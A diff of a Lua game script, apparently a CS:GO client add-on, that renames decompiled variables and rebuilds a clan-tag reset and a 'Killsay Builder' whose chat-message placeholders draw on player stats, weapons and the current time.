 			end
 		end
 
-		client.set_event_callback("player_connect_full", function()
-			var_10_0.Clantag.last = ""
-
-			for iter_89_0, iter_89_1 in ipairs(var_10_0.Clantag.data) do
-				iter_89_1[5] = 0
+		client.set_event_callback('player_connect_full', function()
+			CPLua.Clantag.last = ''
+			for index, value in ipairs(CPLua.Clantag.data) do
+				value[5] = 0
 			end
 		end)
-		client.set_event_callback("round_start", function()
-			var_10_0.Clantag.last = ""
+		client.set_event_callback('round_start', function()
+			CPLua.Clantag.last = ''
 		end)
 	end
+	--#endregion
 
-	if var_0_18.get("Custom Killsay Builder") then
-		var_10_0.CustomKillSay = {}
-		var_10_0.CustomKillSay.enable = ui.new_checkbox("Lua", "B", "Killsay Builder [BETA]")
-		var_10_0.CustomKillSay.template = ui.new_textbox("Lua", "B", "\nKillsay Template")
-		var_10_0.CustomKillSay.helper1 = ui.new_label("Lua", "B", "Helper: type { to get suggestions")
-		var_10_0.CustomKillSay.helper2 = ui.new_label("Lua", "B", "\n")
-		var_10_0.CustomKillSay.helper3 = ui.new_label("Lua", "B", "\n")
-		var_10_0.CustomKillSay.helper4 = ui.new_label("Lua", "B", "\n")
-		var_10_0.CustomKillSay.helper5 = ui.new_label("Lua", "B", "\n")
-		var_10_0.CustomKillSay.helper6 = ui.new_label("Lua", "B", "\n")
-		var_10_0.CustomKillSay.helper7 = ui.new_label("Lua", "B", "\n")
-		var_10_0.CustomKillSay.processedData = {}
+	--#region Custom Killsay Builder
+	if ( Feature.get('Custom Killsay Builder') ) then
+		CPLua.CustomKillSay = {}
+		CPLua.CustomKillSay.enable = ui.new_checkbox('Lua', 'B', 'Killsay Builder [BETA]')
+		CPLua.CustomKillSay.template = ui.new_textbox('Lua', 'B', '\nKillsay Template')
+		CPLua.CustomKillSay.helper1 = ui.new_label('Lua', 'B', 'Helper: type { to get suggestions')
+		CPLua.CustomKillSay.helper2 = ui.new_label('Lua', 'B', '\n')
+		CPLua.CustomKillSay.helper3 = ui.new_label('Lua', 'B', '\n')
+		CPLua.CustomKillSay.helper4 = ui.new_label('Lua', 'B', '\n')
+		CPLua.CustomKillSay.helper5 = ui.new_label('Lua', 'B', '\n')
+		CPLua.CustomKillSay.helper6 = ui.new_label('Lua', 'B', '\n')
+		CPLua.CustomKillSay.helper7 = ui.new_label('Lua', 'B', '\n')
 
-		ui.set_visible(var_10_0.CustomKillSay.template, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper1, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper2, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper3, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper4, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper5, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper6, false)
-		ui.set_visible(var_10_0.CustomKillSay.helper7, false)
-		ui.set_callback(var_10_0.CustomKillSay.enable, function(arg_91_0)
-			local var_91_0 = ui.get(arg_91_0)
+		CPLua.CustomKillSay.processedData = {}
 
-			ui.set_visible(var_10_0.CustomKillSay.template, var_91_0)
-			ui.set(var_10_0.CustomKillSay.helper1, "Helper: type { to get suggestions")
-			ui.set_visible(var_10_0.CustomKillSay.helper1, var_91_0)
-			ui.set_visible(var_10_0.CustomKillSay.helper2, false)
-			ui.set_visible(var_10_0.CustomKillSay.helper3, false)
-			ui.set_visible(var_10_0.CustomKillSay.helper4, false)
-			ui.set_visible(var_10_0.CustomKillSay.helper5, false)
-			ui.set_visible(var_10_0.CustomKillSay.helper6, false)
-			ui.set_visible(var_10_0.CustomKillSay.helper7, false)
+		ui.set_visible(CPLua.CustomKillSay.template, false)
+		ui.set_visible(CPLua.CustomKillSay.helper1, false)
+		ui.set_visible(CPLua.CustomKillSay.helper2, false)
+		ui.set_visible(CPLua.CustomKillSay.helper3, false)
+		ui.set_visible(CPLua.CustomKillSay.helper4, false)
+		ui.set_visible(CPLua.CustomKillSay.helper5, false)
+		ui.set_visible(CPLua.CustomKillSay.helper6, false)
+		ui.set_visible(CPLua.CustomKillSay.helper7, false)
+
+		ui.set_callback(CPLua.CustomKillSay.enable, function(self)
+			local Status = ui.get(self)
+			ui.set_visible(CPLua.CustomKillSay.template, Status)
+			ui.set(CPLua.CustomKillSay.helper1, 'Helper: type { to get suggestions')
+			ui.set_visible(CPLua.CustomKillSay.helper1, Status)
+			ui.set_visible(CPLua.CustomKillSay.helper2, false)
+			ui.set_visible(CPLua.CustomKillSay.helper3, false)
+			ui.set_visible(CPLua.CustomKillSay.helper4, false)
+			ui.set_visible(CPLua.CustomKillSay.helper5, false)
+			ui.set_visible(CPLua.CustomKillSay.helper6, false)
+			ui.set_visible(CPLua.CustomKillSay.helper7, false)
 		end)
 
-		local var_10_16 = {
-			{
-				"vname",
-				"victims kills",
-				function(arg_92_0, arg_92_1)
-					return entity.get_player_name(arg_92_0)
-				end
-			},
-			{
-				"myname",
-				"victims kills",
-				function(arg_93_0, arg_93_1)
-					return entity.get_player_name(arg_93_1)
-				end
-			},
-			{
-				"vuserid",
-				"victims userid",
-				function(arg_94_0, arg_94_1, arg_94_2, arg_94_3)
-					return arg_94_2
-				end
-			},
-			{
-				"myuserid",
-				"my userid",
-				function(arg_95_0, arg_95_1, arg_95_2, arg_95_3)
-					return arg_95_3
-				end
-			},
-			{
-				"ventid",
-				"victims entity id",
-				function(arg_96_0, arg_96_1, arg_96_2, arg_96_3)
-					return arg_96_0
-				end
-			},
-			{
-				"myentid",
-				"victims entity id",
-				function(arg_97_0, arg_97_1, arg_97_2, arg_97_3)
-					return arg_97_1
-				end
-			},
-			{
-				"myname",
-				"victims kills",
-				function(arg_98_0, arg_98_1)
-					return entity.get_player_name(arg_98_1)
-				end
-			},
-			{
-				"vdeaths",
-				"victims deaths",
-				function(arg_99_0, arg_99_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iDeaths", arg_99_0) + 1 or 0
-				end
-			},
-			{
-				"vkills",
-				"victims kills",
-				function(arg_100_0, arg_100_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iKills", arg_100_0) or 0
-				end
-			},
-			{
-				"vassists",
-				"victims assists",
-				function(arg_101_0, arg_101_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iAssists", arg_101_0) or 0
-				end
-			},
-			{
-				"mykills",
-				"my kills",
-				function(arg_102_0, arg_102_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iKills", entity.get_local_player()) or 0
-				end
-			},
-			{
-				"mydeaths",
-				"my kills",
-				function(arg_103_0, arg_103_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iDeaths", entity.get_local_player()) or 0
-				end
-			},
-			{
-				"myassists",
-				"my kills",
-				function(arg_104_0, arg_104_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iAssists", entity.get_local_player()) or 0
-				end
-			},
-			{
-				"vrank",
-				"victims competitive ranking",
-				function(arg_105_0, arg_105_1)
-					local var_105_0 = entity.get_prop(entity.get_player_resource(), "m_iCompetitiveRanking", arg_105_0)
+		-- Helper Code
+		local helperData = {
+			{'vname', 'victims kills', function(victim, attacker)
+				return entity.get_player_name(victim)
+			end},
+			{'myname', 'victims kills', function(victim, attacker)
+				return entity.get_player_name(attacker)
+			end},
+			{'vuserid', 'victims userid', function(victim, attacker, victimuserid, attackeruserid)
+				return victimuserid
+			end},
+			{'myuserid', 'my userid', function(victim, attacker, victimuserid, attackeruserid)
+				return attackeruserid
+			end},
+			{'ventid', 'victims entity id', function(victim, attacker, victimuserid, attackeruserid)
+				return victim
+			end},
+			{'myentid', 'victims entity id', function(victim, attacker, victimuserid, attackeruserid)
+				return attacker
+			end},
+			{'myname', 'victims kills', function(victim, attacker)
+				return entity.get_player_name(attacker)
+			end},
+			{'vdeaths', 'victims deaths', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iDeaths', victim) + 1 or 0
+			end},
+			{'vkills', 'victims kills', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iKills', victim) or 0
+			end},
+			{'vassists', 'victims assists', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iAssists', victim) or 0
+			end},
+			{'mykills', 'my kills', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iKills', entity.get_local_player()) or 0
+			end},
+			{'mydeaths', 'my kills', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iDeaths', entity.get_local_player()) or 0
+			end},
+			{'myassists', 'my kills', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iAssists', entity.get_local_player()) or 0
+			end},
+			{'vrank', 'victims competitive ranking', function(victim, attacker)
+				local currentRank = entity.get_prop(entity.get_player_resource(), 'm_iCompetitiveRanking', victim)
+				if ( currentRank == 0 ) then return 'N/A' end
 
-					if var_105_0 == 0 then
-						return "N/A"
-					end
+				if ( currentRank ) then
+					local CurrentMode = GameStateAPI.GetGameModeInternalName(true)
+					local RankLong = _.Localize(CurrentMode == 'survival' and '#skillgroup_'..currentRank..'dangerzone' or 'RankName_' .. currentRank)
+					local RankName = getRankShortName(RankLong)
 
-					if var_105_0 then
-						local var_105_1 = var_0_9.GetGameModeInternalName(true)
-						local var_105_2 = var_0_7.Localize(var_105_1 == "survival" and "#skillgroup_" .. var_105_0 .. "dangerzone" or "RankName_" .. var_105_0)
+					return RankName
+				end
+			end},
+			{'myrank', 'my competitive ranking', function(victim, attacker)
+				local currentRank = entity.get_prop(entity.get_player_resource(), 'm_iCompetitiveRanking', entity.get_local_player())
+				if ( currentRank == 0 ) then return 'N/A' end
 
-						return (getRankShortName(var_105_2))
-					end
-				end
-			},
-			{
-				"myrank",
-				"my competitive ranking",
-				function(arg_106_0, arg_106_1)
-					local var_106_0 = entity.get_prop(entity.get_player_resource(), "m_iCompetitiveRanking", entity.get_local_player())
+				if ( currentRank ) then
+					local CurrentMode = GameStateAPI.GetGameModeInternalName(true)
+					local RankLong = _.Localize(CurrentMode == 'survival' and '#skillgroup_'..currentRank..'dangerzone' or 'RankName_' .. currentRank)
+					local RankName = getRankShortName(RankLong)
 
-					if var_106_0 == 0 then
-						return "N/A"
-					end
+					return RankName
+				end
+			end},
+			{'vwins', 'victims competitive wins', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iCompetitiveWins', victim) or ''
+			end},
+			{'mywins', 'my competitive wins', function(victim, attacker)
+				return entity.get_prop(entity.get_player_resource(), 'm_iCompetitiveWins', entity.get_local_player()) or ''
+			end},
+			{'vhp', 'my current health', function(victim, attacker)
+				return entity.get_prop(victim, 'm_iHealth') or 0
+			end},
+			{'myhp', 'my current health', function(victim, attacker)
+				return entity.get_prop(entity.get_local_player(), 'm_iHealth') or 0
+			end},
+			{'vamr', 'victim current armor', function(victim, attacker)
+				return entity.get_prop(victim, 'm_ArmorValue') or 0
+			end},
+			{'myamr', 'current armor', function(victim, attacker)
+				return entity.get_prop(entity.get_local_player(), 'm_ArmorValue') or 0
+			end},
+			{'vloc', 'victim current location', function(victim, attacker)
+				return _.Localize(entity.get_prop(victim, 'm_szLastPlaceName')) or ''
+			end},
+			{'myloc', 'current location', function(victim, attacker)
+				return _.Localize(entity.get_prop(entity.get_local_player(), 'm_szLastPlaceName')) or ''
+			end},
+			{'vheadchance', 'victim current headshot chance', function(victim, attacker)
+				local TotalKills = entity.get_prop(entity.get_player_resource(), 'm_iKills', victim) or 0
+				local HeadshotKills = entity.get_prop(entity.get_player_resource(), 'm_iMatchStats_HeadShotKills_Total', victim) or 0
+				if ( TotalKills and HeadshotKills ) then				
+					return math.ceil( (HeadshotKills / TotalKills) * 100 )
+				end
+			end},
+			{'myheadchance', 'current headshot chance', function(victim, attacker)
+				local TotalKills = entity.get_prop(entity.get_player_resource(), 'm_iKills', entity.get_local_player()) or 0
+				local HeadshotKills = entity.get_prop(entity.get_player_resource(), 'm_iMatchStats_HeadShotKills_Total', entity.get_local_player())
+				if ( TotalKills and HeadshotKills ) then				
+					return math.ceil( (HeadshotKills / TotalKills) * 100 )
+				end
+			end},
+			{'mywep', 'current weapon name', function(victim, attacker)
+				local LocalPlayer = entity.get_local_player()
 
-					if var_106_0 then
-						local var_106_1 = var_0_9.GetGameModeInternalName(true)
-						local var_106_2 = var_0_7.Localize(var_106_1 == "survival" and "#skillgroup_" .. var_106_0 .. "dangerzone" or "RankName_" .. var_106_0)
+				local WeaponENT = entity.get_player_weapon(LocalPlayer)
+				if WeaponENT == nil then return end
 
-						return (getRankShortName(var_106_2))
-					end
-				end
-			},
-			{
-				"vwins",
-				"victims competitive wins",
-				function(arg_107_0, arg_107_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iCompetitiveWins", arg_107_0) or ""
-				end
-			},
-			{
-				"mywins",
-				"my competitive wins",
-				function(arg_108_0, arg_108_1)
-					return entity.get_prop(entity.get_player_resource(), "m_iCompetitiveWins", entity.get_local_player()) or ""
-				end
-			},
-			{
-				"vhp",
-				"my current health",
-				function(arg_109_0, arg_109_1)
-					return entity.get_prop(arg_109_0, "m_iHealth") or 0
-				end
-			},
-			{
-				"myhp",
-				"my current health",
-				function(arg_110_0, arg_110_1)
-					return entity.get_prop(entity.get_local_player(), "m_iHealth") or 0
-				end
-			},
-			{
-				"vamr",
-				"victim current armor",
-				function(arg_111_0, arg_111_1)
-					return entity.get_prop(arg_111_0, "m_ArmorValue") or 0
-				end
-			},
-			{
-				"myamr",
-				"current armor",
-				function(arg_112_0, arg_112_1)
-					return entity.get_prop(entity.get_local_player(), "m_ArmorValue") or 0
-				end
-			},
-			{
-				"vloc",
-				"victim current location",
-				function(arg_113_0, arg_113_1)
-					return var_0_7.Localize(entity.get_prop(arg_113_0, "m_szLastPlaceName")) or ""
-				end
-			},
-			{
-				"myloc",
-				"current location",
-				function(arg_114_0, arg_114_1)
-					return var_0_7.Localize(entity.get_prop(entity.get_local_player(), "m_szLastPlaceName")) or ""
-				end
-			},
-			{
-				"vheadchance",
-				"victim current headshot chance",
-				function(arg_115_0, arg_115_1)
-					local var_115_0 = entity.get_prop(entity.get_player_resource(), "m_iKills", arg_115_0) or 0
-					local var_115_1 = entity.get_prop(entity.get_player_resource(), "m_iMatchStats_HeadShotKills_Total", arg_115_0) or 0
+				local WeaponIDX = entity.get_prop(WeaponENT, "m_iItemDefinitionIndex")
+				if WeaponIDX == nil then return end
 
-					if var_115_0 and var_115_1 then
-						return math.ceil(var_115_1 / var_115_0 * 100)
-					end
-				end
-			},
-			{
-				"myheadchance",
-				"current headshot chance",
-				function(arg_116_0, arg_116_1)
-					local var_116_0 = entity.get_prop(entity.get_player_resource(), "m_iKills", entity.get_local_player()) or 0
-					local var_116_1 = entity.get_prop(entity.get_player_resource(), "m_iMatchStats_HeadShotKills_Total", entity.get_local_player())
+				local weapon = csgo_weapons[WeaponIDX]
+				if weapon == nil then return end
+				
+				return weapon.name
+			end},
+			{'vwep', 'current weapon name', function(victim, attacker)
+				local Weapon = CPLua.CustomKillSay.vwep[victim]
 
-					if var_116_0 and var_116_1 then
-						return math.ceil(var_116_1 / var_116_0 * 100)
-					end
-				end
-			},
-			{
-				"mywep",
-				"current weapon name",
-				function(arg_117_0, arg_117_1)
-					local var_117_0 = entity.get_local_player()
-					local var_117_1 = entity.get_player_weapon(var_117_0)
+				-- print(2, Weapon)
 
-					if var_117_1 == nil then
-						return
-					end
+				local WeaponIDX = entity.get_prop(Weapon, "m_iItemDefinitionIndex")
+				if WeaponIDX == nil then return end
 
-					local var_117_2 = entity.get_prop(var_117_1, "m_iItemDefinitionIndex")
+				local weapon = csgo_weapons[WeaponIDX]
+				if weapon == nil then return end
+				
+				return weapon.name
+			end},
+			{'ammo', 'current weapon ammo', function(victim, attacker)
+				local LocalPlayer = entity.get_local_player()
 
-					if var_117_2 == nil then
-						return
-					end
-
-					local var_117_3 = var_0_1[var_117_2]
-
-					if var_117_3 == nil then
-						return
-					end
-
-					return var_117_3.name
-				end
-			},
-			{
-				"vwep",
-				"current weapon name",
-				function(arg_118_0, arg_118_1)
-					local var_118_0 = var_10_0.CustomKillSay.vwep[arg_118_0]
-					local var_118_1 = entity.get_prop(var_118_0, "m_iItemDefinitionIndex")
-
-					if var_118_1 == nil then
-						return
-					end
-
-					local var_118_2 = var_0_1[var_118_1]
-
-					if var_118_2 == nil then
-						return
-					end
-
-					return var_118_2.name
-				end
-			},
-			{
-				"ammo",
-				"current weapon ammo",
-				function(arg_119_0, arg_119_1)
-					local var_119_0 = entity.get_local_player()
-					local var_119_1 = entity.get_player_weapon(var_119_0)
-
-					if var_119_1 == nil then
-						return
-					end
-
-					local var_119_2 = entity.get_prop(var_119_1, "m_iClip1")
-
-					if var_119_2 == nil then
-						return
-					end
-
-					return var_119_2
-				end
-			},
-			{
-				"vsteam64",
-				"victim steam id",
-				function(arg_120_0, arg_120_1)
-					return var_0_9.GetPlayerXuidStringFromEntIndex(arg_120_0)
-				end
-			},
-			{
-				"mysteam64",
-				"my steam id",
-				function(arg_121_0, arg_121_1)
-					return var_0_13.GetXuid()
-				end
-			},
-			{
-				"bomb",
-				"bomb timer countdown",
-				function(arg_122_0, arg_122_1)
-					local var_122_0 = entity.get_all("CPlantedC4")[1]
-
-					if var_122_0 == nil or entity.get_prop(var_122_0, "m_bBombDefused") == 1 or entity.get_local_player() == nil then
-						return ""
-					end
-
-					local var_122_1 = entity.get_prop(var_122_0, "m_flC4Blow") - globals.curtime()
-
-					return var_122_1 ~= nil and var_122_1 > 0 and math.floor(var_122_1) or ""
-				end
-			},
-			{
-				"doa",
-				"displays DEAD or ALIVE",
-				function(arg_123_0, arg_123_1)
-					return entity.is_alive(entity.get_local_player()) and "ALIVE" or "DEAD"
-				end
-			},
-			{
-				"ping",
-				"current ping",
-				function(arg_124_0, arg_124_1)
-					return math.floor(client.latency() * 1000)
-				end
-			},
-			{
-				"date",
-				"current date (DD/MM/YY)",
-				function(arg_125_0, arg_125_1)
-					local var_125_0 = Date(client.unix_time())
-					local var_125_1 = string.format("%02d", var_125_0.getDate())
-					local var_125_2 = string.format("%02d", var_125_0.getMonth() + 1)
-
-					return string.format("%s/%s/%s", var_125_1, var_125_2, tostring(var_125_0.getFullYear()):sub(3, 4))
-				end
-			},
-			{
-				"shortday",
-				"current name of the day (Mon, Wed, Tue)",
-				function(arg_126_0, arg_126_1)
-					return ({
-						"Sun",
-						"Mon",
-						"Tue",
-						"Wed",
-						"Thu",
-						"Fri",
-						"Sat"
-					})[Date(client.unix_time()).getDay() + 1]
-				end
-			},
-			{
-				"longday",
-				"current name of the day (Monday, Wednesday, Tuesday)",
-				function(arg_127_0, arg_127_1)
-					return ({
-						"Sunday",
-						"Monday",
-						"Tuesday",
-						"Wednesday",
-						"Thursday",
-						"Friday",
-						"Saturday"
-					})[Date(client.unix_time()).getDay() + 1]
-				end
-			},
-			{
-				"day",
-				"current day of the month",
-				function(arg_128_0, arg_128_1)
-					local var_128_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_128_0.getDate())
-				end
-			},
-			{
-				"month",
-				"current month number",
-				function(arg_129_0, arg_129_1)
-					local var_129_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_129_0.getMonth() + 1)
-				end
-			},
-			{
-				"year",
-				"current year number",
-				function(arg_130_0, arg_130_1)
-					local var_130_0 = Date(client.unix_time())
-
-					return tostring(var_130_0.getFullYear()):sub(3, 4)
-				end
-			},
-			{
-				"time12",
-				"current time in 12 hour time",
-				function(arg_131_0, arg_131_1)
-					local var_131_0 = Date(client.unix_time())
-					local var_131_1 = var_131_0.getHours()
-					local var_131_2 = var_131_1 > 12 and "PM" or "AM"
-					local var_131_3 = string.format("%02d", var_131_1 > 12 and var_131_1 - 12 or var_131_1)
-					local var_131_4 = string.format("%02d", var_131_0.getMinutes())
-					local var_131_5 = string.format("%02d", var_131_0.getSeconds())
-
-					return string.format("%s:%s:%s %s", var_131_3, var_131_4, var_131_5, var_131_2)
-				end
-			},
-			{
-				"time24",
-				"current time in 24 hour time",
-				function(arg_132_0, arg_132_1)
-					local var_132_0 = Date(client.unix_time())
-					local var_132_1 = string.format("%02d", var_132_0.getHours())
-					local var_132_2 = string.format("%02d", var_132_0.getMinutes())
-					local var_132_3 = string.format("%02d", var_132_0.getSeconds())
-
-					return string.format("%s:%s:%s", var_132_1, var_132_2, var_132_3)
-				end
-			},
-			{
-				"hour12",
-				"hour in 12 hour time",
-				function(arg_133_0, arg_133_1)
-					local var_133_0 = Date(client.unix_time()).getHours()
-
-					return string.format("%02d", var_133_0 > 12 and var_133_0 - 12 or var_133_0)
-				end
-			},
-			{
-				"hour24",
-				"hour in 24 hour time",
-				function(arg_134_0, arg_134_1)
-					return Date(client.unix_time()).getHours()
-				end
-			},
-			{
-				"mins",
-				"current minutes in system time",
-				function(arg_135_0, arg_135_1)
-					local var_135_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_135_0.getMinutes())
-				end
-			},
-			{
-				"secs",
-				"current seconds in system time",
-				function(arg_136_0, arg_136_1)
-					local var_136_0 = Date(client.unix_time())
-
-					return string.format("%02d", var_136_0.getSeconds())
-				end
-			},
-			{
-				"timesuffix",
-				"12 hour time suffix",
-				function(arg_137_0, arg_137_1)
-					return Date(client.unix_time()).getHours() > 12 and "PM" or "AM"
-				end
-			}
+				local WeaponENT = entity.get_player_weapon(LocalPlayer)
+				if WeaponENT == nil then return end
+				
+				local Ammo = entity.get_prop(WeaponENT, "m_iClip1")
+				if Ammo == nil then return end
+				
+				return Ammo
+			end},
+			{'vsteam64', 'victim steam id', function(victim, attacker)
+				return GameStateAPI.GetPlayerXuidStringFromEntIndex(victim)
+			end},
+			{'mysteam64', 'my steam id', function(victim, attacker)
+				return MyPersonaAPI.GetXuid()
+			end},
+			{'bomb', 'bomb timer countdown', function(victim, attacker)
+				local c4 = entity.get_all("CPlantedC4")[1]
+				if c4 == nil or entity.get_prop(c4, "m_bBombDefused") == 1 or entity.get_local_player() == nil then return '' end
+				local c4_time = entity.get_prop(c4, "m_flC4Blow") - globals.curtime()
+				return c4_time ~= nil and c4_time > 0 and math.floor(c4_time) or ''
+			end},
+			{'doa', 'displays DEAD or ALIVE', function(victim, attacker)
+				return entity.is_alive(entity.get_local_player()) and 'ALIVE' or 'DEAD'
+			end},
+			{'ping', 'current ping', function(victim, attacker)
+				return math.floor(client.latency()*1000)
+			end},
+			{'date', 'current date (DD/MM/YY)', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				local Day = string.format("%02d", Data.getDate())
+				local Month = string.format("%02d", Data.getMonth()+1)
+				return string.format('%s/%s/%s', Day, Month, tostring(Data.getFullYear()):sub(3,4))
+			end},
+			{'shortday', 'current name of the day (Mon, Wed, Tue)', function(victim, attacker)
+				local DaysOfWeek = {'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'}
+				local Data = Date(client.unix_time())
+				return DaysOfWeek[Data.getDay()+1]
+			end},
+			{'longday', 'current name of the day (Monday, Wednesday, Tuesday)', function(victim, attacker)
+				local DaysOfWeek = {'Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'}
+				local Data = Date(client.unix_time())
+				return DaysOfWeek[Data.getDay()+1]
+			end},
+			{'day', 'current day of the month', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getDate())
+			end},
+			{'month', 'current month number', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getMonth()+1)
+			end},
+			{'year', 'current year number', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				return tostring(Data.getFullYear()):sub(3,4)
+			end},
+			{'time12', 'current time in 12 hour time', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				local Hours = Data.getHours()
+				local Suffix = Hours > 12 and 'PM' or 'AM'
+				Hours = string.format("%02d", Hours > 12 and Hours - 12 or Hours)
+				local Minutes = string.format("%02d", Data.getMinutes())
+				local Seconds = string.format("%02d", Data.getSeconds())
+				return string.format('%s:%s:%s %s', Hours, Minutes, Seconds, Suffix)
+			end},
+			{'time24', 'current time in 24 hour time', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				local Hours = string.format("%02d", Data.getHours())
+				local Minutes = string.format("%02d", Data.getMinutes())
+				local Seconds = string.format("%02d", Data.getSeconds())
+				return string.format('%s:%s:%s', Hours, Minutes, Seconds)
+			end},
+			{'hour12', 'hour in 12 hour time', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				local Hours = Data.getHours()
+				return string.format("%02d", Hours > 12 and Hours - 12 or Hours)
+			end},
+			{'hour24', 'hour in 24 hour time', function(victim, attacker)	
+				local Data = Date(client.unix_time())
+				return Data.getHours()
+			end},
+			{'mins', 'current minutes in system time', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getMinutes())
+			end},
+			{'secs', 'current seconds in system time', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				return string.format("%02d", Data.getSeconds())
+			end},
+			{'timesuffix', '12 hour time suffix', function(victim, attacker)
+				local Data = Date(client.unix_time())
+				local Hours = Data.getHours()
+				return Hours > 12 and 'PM' or 'AM'
+			end}
 		}
 
-		var_10_0.CustomKillSay.vwep = {}
-
-		client.set_event_callback("run_command", function()
-			for iter_138_0 = 1, globals.maxplayers() do
-				local var_138_0 = entity.get_prop(iter_138_0, "m_hActiveWeapon")
-
-				if var_138_0 then
-					var_10_0.CustomKillSay.vwep[iter_138_0] = var_138_0
+		-- vwep calculation
+		CPLua.CustomKillSay.vwep = {}
+		client.set_event_callback('run_command', function()
+			for Player=1, globals.maxplayers() do
+				local m_hActiveWeapon = entity.get_prop(Player, 'm_hActiveWeapon')
+				if ( m_hActiveWeapon ) then
+					CPLua.CustomKillSay.vwep[Player] = m_hActiveWeapon
 				end
 			end
 		end)
 
-		local var_10_17 = ui.get(var_10_0.CustomKillSay.template)
-
-		client.set_event_callback("post_render", function()
-			local var_139_0 = ui.get(var_10_0.CustomKillSay.template)
-
-			if var_139_0 ~= var_10_17 then
-				var_10_17 = var_139_0
-
-				local var_139_1 = var_139_0:match("{(%a*%d*)$")
-
-				if var_139_1 then
-					local var_139_2 = false
-
-					if var_139_1:len() > 0 then
-						for iter_139_0, iter_139_1 in ipairs(var_10_16) do
-							if iter_139_1[1]:sub(1, var_139_1:len()) == var_139_1:lower() then
-								var_139_2 = iter_139_1
-
-								break
+		local LastKillsayText = ui.get(CPLua.CustomKillSay.template)
+		client.set_event_callback('post_render', function()
+			local TemplateText = ui.get(CPLua.CustomKillSay.template)
+			if ( TemplateText ~= LastKillsayText ) then
+				LastKillsayText = TemplateText
+				local Match = TemplateText:match('{(%a*%d*)$')
+				if ( Match ) then
+					local FoundMatch = false
+					if ( Match:len() > 0 ) then
+						for i, v in ipairs(helperData) do
+							if ( v[1]:sub(1, Match:len()) == Match:lower() ) then
+								FoundMatch = v
+								break;
 							end
 						end
-
-						if var_139_2 then
-							ui.set(var_10_0.CustomKillSay.helper1, "{" .. var_139_2[1] .. "} - " .. var_139_2[2])
+						if ( FoundMatch ) then
+							ui.set(CPLua.CustomKillSay.helper1, '{' .. FoundMatch[1] .. '} - ' .. FoundMatch[2])
 						else
-							ui.set(var_10_0.CustomKillSay.helper1, "no matches found for {" .. var_139_1 .. "}")
+							ui.set(CPLua.CustomKillSay.helper1, 'no matches found for {' .. Match .. '}' )
 						end
-
-						ui.set_visible(var_10_0.CustomKillSay.helper2, false)
-						ui.set_visible(var_10_0.CustomKillSay.helper3, false)
-						ui.set_visible(var_10_0.CustomKillSay.helper4, false)
-						ui.set_visible(var_10_0.CustomKillSay.helper5, false)
-						ui.set_visible(var_10_0.CustomKillSay.helper6, false)
-						ui.set_visible(var_10_0.CustomKillSay.helper7, false)
+						ui.set_visible(CPLua.CustomKillSay.helper2, false)
+						ui.set_visible(CPLua.CustomKillSay.helper3, false)
+						ui.set_visible(CPLua.CustomKillSay.helper4, false)
+						ui.set_visible(CPLua.CustomKillSay.helper5, false)
+						ui.set_visible(CPLua.CustomKillSay.helper6, false)
+						ui.set_visible(CPLua.CustomKillSay.helper7, false)
 					else
-						local var_139_3 = {
+						local HelperCMDS = {
 							helper1 = {},
 							helper2 = {},
 							helper3 = {},
 							helper4 = {},
 							helper5 = {},
 							helper6 = {},
-							helper7 = {}
+							helper7 = {},
 						}
-						local var_139_4 = {}
-
-						for iter_139_2, iter_139_3 in ipairs(var_10_16) do
-							var_139_4[#var_139_4 + 1] = iter_139_3[1]
+						local cmds = {}
+						for i, v in ipairs(helperData) do
+							cmds[#cmds + 1] = v[1]
 						end
-
-						for iter_139_4 = 1, 7 do
-							local var_139_5 = var_139_4[iter_139_4]
-
-							if var_139_5 then
-								var_139_3.helper1[#var_139_3.helper1 + 1] = var_139_5
+					
+						-- I'm going to do some proper maths for this at a later date.
+						for i=1, 7 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper1[#HelperCMDS.helper1 + 1] = cmd
 							end
 						end
-
-						for iter_139_5 = 8, 14 do
-							local var_139_6 = var_139_4[iter_139_5]
-
-							if var_139_6 then
-								var_139_3.helper2[#var_139_3.helper2 + 1] = var_139_6
+						for i=8, 14 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper2[#HelperCMDS.helper2 + 1] = cmd
 							end
 						end
-
-						for iter_139_6 = 15, 21 do
-							local var_139_7 = var_139_4[iter_139_6]
-
-							if var_139_7 then
-								var_139_3.helper3[#var_139_3.helper3 + 1] = var_139_7
+						for i=15, 21 do
+							local cmd = cmds[i]
+							if cmd then
+								HelperCMDS.helper3[#HelperCMDS.helper3 + 1] = cmd
 							end
 						end
-
-						for iter_139_7 = 22, 28 do
-							local var_139_8 = var_139_4[iter_139_7]
-
-							if var_139_8 then
